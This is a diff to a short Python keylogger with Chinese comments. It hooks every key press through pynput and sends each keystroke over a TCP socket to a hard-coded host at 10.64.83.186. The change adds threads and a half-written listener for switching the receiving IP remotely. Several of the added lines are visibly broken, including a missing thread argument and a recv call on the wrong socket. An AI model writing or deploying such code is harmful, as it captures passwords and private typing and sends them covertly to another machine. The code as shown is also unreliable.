@@ -1,17 +1,30 @@
 from pynput.keyboard import Key, Listener
 import socket
+import threading
 import re
 
-host = "10.64.83.186"
+localHost = "10.64.83.186"
+transferHost = "10.64.83.186"
 port = 5051
 
-s = socket.socket()
-s.connect((host, port))
+transferSocket = socket.socket()
+transferSocket.connect((transferHost, port))
+
+
+def receive(port):
+    receiveSocker = socket.socket()
+    receiveSocker.bind((localHost, port))
+    receiveSocker.listen(5)
+    while True:
+        c, addr = receiveSocker.accept()
+        transferHost = receiveSocker.recv(20)
+        # CHANGE IP
+    receiveSocker.close()
 
 
 def on_press(key):
     key = str(key).encode()
-    s.send(key)
+    transferSocket.send(key)
     # 监听按键
     # print('{0} pressed'.format(key))
     print(key)
@@ -26,7 +39,16 @@ def on_release(key):
         return False
 
 
-if __name__ == '__main__':
-    # 连接事件以及释放
+def transfer():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
+
+if __name__ == '__main__':
+    # 连接事件以及释放
+    transferThread = threading.Thread(target=transfer)
+    transferThread.setDaemon(True)
+    transferThread.start()
+    receiveThread = threading.Thread(target=receive)
+    receiveThread.setDaemon(True)
+    receiveThread.start()
